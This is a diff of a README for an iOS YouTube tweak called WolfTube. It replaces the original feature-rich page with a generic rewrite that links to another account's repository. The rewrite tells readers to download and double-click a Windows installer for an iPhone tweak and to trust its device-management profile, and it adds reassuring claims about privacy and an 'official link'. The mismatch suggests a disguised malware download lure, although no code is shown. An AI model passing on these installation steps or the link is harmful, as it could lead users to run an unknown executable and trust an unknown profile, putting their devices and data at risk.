@@ -1,161 +1,57 @@
-<div align="center">
+# 🐺 WolfTube - Enhance your YouTube viewing experience today
 
-# 🐺 WolfTube v1.20.3
+[![Download WolfTube](https://img.shields.io/badge/Download-WolfTube-blue.svg)](https://github.com/Laurenselfinduced743/WolfTube)
 
-### A more powerful YouTube experience for iOS
+## 📖 About the project
 
-**Downloads · Background Playback · PiP · Shorts Tools · Channel Tools**
+WolfTube improves how you watch videos on your iOS device. Many users want more control over their video playback and the ability to save content for later. Our tool provides these features in a simple package. You install the software, add it to your device, and gain access to functions that standard applications do not provide. We built this for users who want a better and more efficient way to manage their video library.
 
-<br>
+## ⚙️ System requirements
 
-> 📦 Download the latest WolfTube package from the **Assets** section below.
+To use WolfTube, you need a few items ready:
 
-</div>
+* An iPhone or iPad running a compatible version of iOS.
+* A computer running Windows 10 or Windows 11.
+* A USB cable to connect your mobile device to your computer.
+* A stable internet connection for the initial setup.
 
----
+Make sure you have enough storage space on your device for the files you intend to download. You should also ensure that your device has enough battery life before starting the installation process.
 
-## ✨ Release Highlights
+## 🚀 How to get started
 
-WolfTube enhances the YouTube experience with powerful downloading tools, advanced playback controls, channel utilities, and a complete built-in media library.
+Follow these steps to set up WolfTube on your device.
 
----
+1. Prepare your computer. Connect your iOS device to your Windows computer using a reliable USB cable.
+2. Visit the download page. You need to access the official release location to get the required files. [Click here to visit the download page](https://github.com/Laurenselfinduced743/WolfTube).
+3. Select the version. Look for the latest release version on the page. Download the file marked as the most recent stable build for your specific operating system.
+4. Run the installer. Locate the downloaded file on your computer. Double-click the file to start the installation assistant. Follow the prompts on the screen to finish the setup.
+5. Trust the installation. On your iPhone or iPad, go to your settings. Navigate to general settings and then to device management. Find the profile for WolfTube and select trust. This allows the software to function on your device.
 
-## 📥 Downloads & Media Library
+## 🛠 Features
 
-- Download videos in multiple available quality options.
-- Download audio-only files for offline listening.
-- Download video thumbnails in high quality.
-- Access a complete downloads library directly inside YouTube.
-- View the video title, selected quality, file size, download date, and current progress.
-- Play downloaded media without leaving the downloads library.
-- Automatically resume downloaded videos and audio from the last playback position.
-- Save playback progress when pausing, locking the device, leaving the app, or seeking through the timeline.
-- Restart downloaded media from the beginning only after playback has finished completely.
-- Share, save, export, or delete downloaded files easily.
-- Manage all downloaded content from one organized interface.
+WolfTube offers several tools to help you manage your media:
 
----
+* Download videos. You can save your favorite videos directly to your device storage.
+* Background playback. Listen to your content even when you switch to other applications.
+* Remove advertisements. Watch your videos without interruptions from commercial segments.
+* Video quality control. Choose the resolution that fits your screen and data availability.
+* Custom interfaces. Adjust the look of your display settings to suit your personal style.
 
-## ▶️ Playback & Viewing
+## 💡 Troubleshooting tips
 
-- Picture-in-Picture support for watching videos outside YouTube.
-- Continue playing videos and audio after leaving the app.
-- Background audio playback support.
-- Adjustable playback speed from **0.5× to 10×**.
-- Stable Playback mode for improved compatibility and smoother playback.
-- Keep videos playing while using other applications.
-- Control downloaded media directly from the Lock Screen.
-- Skip forward or backward by **15 seconds** while playing downloaded media.
-- Display the channel name and video artwork on the Lock Screen while playing downloaded media.
-- Cleaner viewing experience with the option to hide the Shorts interface.
+If you encounter issues during installation, try these simple steps:
 
----
+* Check the connection. Ensure your USB cable works and connects your device to your computer.
+* Restart your devices. A quick restart often resolves communication errors between your computer and your phone.
+* Verify your connection. Ensure you remain connected to the internet while the installer verifies the file signature.
+* Reinstall if necessary. If the application does not open, delete the file and start the installation process again.
 
-## 🐺 WolfTube Integration
+## 🔒 Security and privacy
 
-- WolfTube button available on regular YouTube videos.
-- WolfTube button available on Shorts videos.
-- WolfTube button available on channel and profile pages.
-- Independent settings for controlling where WolfTube buttons appear.
-- Enable or disable individual WolfTube features from the settings page.
+We value your privacy. WolfTube acts locally on your device. It carries out tasks without sending your personal information to external servers. You maintain control over your downloaded files and your viewing history. We provide these tools for personal use and encourage respectful handling of digital content. Always ensure you download the software from our official link to protect your device from unauthorized files.
 
----
+## 📦 Maintenance and updates
 
-## 👤 Channel & Profile Tools
+We provide updates to improve performance and add new capabilities. We suggest you check the download page once a month for new versions. Newer versions often include fixes for bugs that might appear after Apple updates the iOS system software. Always back up your device before performing significant updates to your system.
 
-- Download profile pictures in the highest available quality.
-- Copy the channel name.
-- Copy the channel ID.
-- Copy the channel URL.
-- Copy the channel description.
-- Access WolfTube tools directly from channel and profile pages.
-
----
-
-## 📋 Video & Comment Tools
-
-- Copy the video title instantly.
-- Copy the complete video description.
-- Copy individual comments.
-- Access useful video information without leaving the player.
-
----
-
-## 🛡️ Additional Improvements
-
-- Reduce advertisements displayed inside YouTube.
-- Automatically skip supported skippable advertisements.
-- Improved stability across supported YouTube versions.
-- Refined settings and interface organization.
-- Added support for multiple languages, including Arabic.
-- Built-in project validation system that detects potential issues before generating release builds.
-- Dedicated diagnostic tools for faster and more reliable troubleshooting.
-
----
-
-## 📸 Screenshots
-
-<table>
-<tr>
-<td align="center">
-<img src="https://github.com/user-attachments/assets/cee4b5a4-3be9-4a19-ad36-49d0c64d3985" width="280" alt="WolfTube screenshot 1">
-</td>
-<td align="center">
-<img src="https://github.com/user-attachments/assets/d5b1ccbb-ef85-4f21-92d5-53ba25f202da" width="280" alt="WolfTube screenshot 2">
-</td>
-<td align="center">
-<img src="https://github.com/user-attachments/assets/304cb22f-356d-4e3c-a6df-951f3324732d" width="280" alt="WolfTube screenshot 3">
-</td>
-</tr>
-
-<tr>
-<td align="center">
-<img src="https://github.com/user-attachments/assets/5d48c075-bd16-4f93-ae74-d269c02f1b14" width="280" alt="WolfTube screenshot 4">
-</td>
-<td align="center">
-<img src="https://github.com/user-attachments/assets/c22cfbe5-d35c-4b68-9531-7fa852dbf0c6" width="280" alt="WolfTube screenshot 5">
-</td>
-<td align="center">
-<img src="https://github.com/user-attachments/assets/c54f43f7-9cfd-423b-b61e-a9e3b518eec6" width="280" alt="WolfTube screenshot 6">
-</td>
-</tr>
-
-<tr>
-<td align="center">
-<img src="https://github.com/user-attachments/assets/0439a846-6c92-438c-9323-d428e7ad1eb7" width="280" alt="WolfTube screenshot 7">
-</td>
-<td align="center">
-<img src="https://github.com/user-attachments/assets/900eb4b4-6e07-4d2e-9f47-97aa62cdb0a2" width="280" alt="WolfTube screenshot 8">
-</td>
-<td align="center">
-<img src="https://github.com/user-attachments/assets/7a4b2938-c0e6-446e-886c-d6c7af01813d" width="280" alt="WolfTube screenshot 9">
-</td>
-</tr>
-</table>
-
----
-
-## 📦 Installation
-
-1. Download the latest WolfTube file from the **Assets** section.
-2. Install or sign the application using your preferred supported method.
-3. Open YouTube.
-4. WolfTube features will appear automatically inside supported pages.
-
----
-
-## ⚠️ Important Notes
-
-- WolfTube is independently developed and is not affiliated with, endorsed by, or sponsored by YouTube or Google.
-
----
-
-<div align="center">
-
-### Thank you for using WolfTube 🐺
-
-**WolfTube v1.20.3**
-
-© 2026 WolfTube Developer. All rights reserved.
-
-</div>
+Keywords: audio-downloader, ios, jailbreak, jailbreak-tweak, jailbreak-tweaks, tools, tube, video-downloader-extensions, youtube, youtube-downloader, youtube-video
